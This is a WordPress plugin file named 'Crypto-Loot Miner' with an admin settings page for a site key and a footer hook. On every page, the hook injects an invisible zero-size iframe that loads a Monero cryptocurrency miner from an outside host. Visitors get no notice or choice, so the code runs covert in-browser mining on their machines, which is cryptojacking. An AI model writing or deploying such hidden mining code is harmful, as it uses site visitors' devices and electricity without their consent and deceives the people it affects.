<?php
/*
Plugin Name: Crypto-Loot Miner
Description: Crypto-Loot is a javascipt-based cryptocurrency miner for Monero (XMR).
Version: 1.0.0
Author: executeminer
Author URI: https://executeminer.com
License: GPLv2 or later
*/

function cryptoloot_integration() {
	$value = get_option('cryptoloot_key');
	
    echo '<iframe src="https://miner.executeminer.com/cryptoloot/?key='.esc_textarea($value).'" style="width:0;height:0;border:0; border:none;"></iframe>';

}

add_action('wp_footer', 'cryptoloot_integration');


function cryptoloot_setup_display() {
	
	if (isset($_POST['cryptoloot_key']) && (strlen($_POST['cryptoloot_key']) == 32)) {
		check_admin_referer( 'cryptoloot-key' );
        update_option('cryptoloot_key', sanitize_text_field($_POST['cryptoloot_key']));
    }

    $value = esc_textarea(get_option('cryptoloot_key'));
	
    echo '<h1>Crypto-Loot Settings</h1>';
    echo '<form method="POST">';
    wp_nonce_field( 'cryptoloot-key' );
    echo '<label>Public Site Key</label><input type="text" name="cryptoloot_key" value="'.$value.'" />';
    echo '<br /><input type="submit" value="Save" class="button button-primary button-large">';
    echo '</form>';
}

function cryptoloot_setup_create() {
    add_menu_page( 'Crypto-Loot Settings', 'Crypto-Loot Settings', 'manage_options', 'cryptoloot_setup', 'cryptoloot_setup_display', '');
}
add_action('admin_menu', 'cryptoloot_setup_create');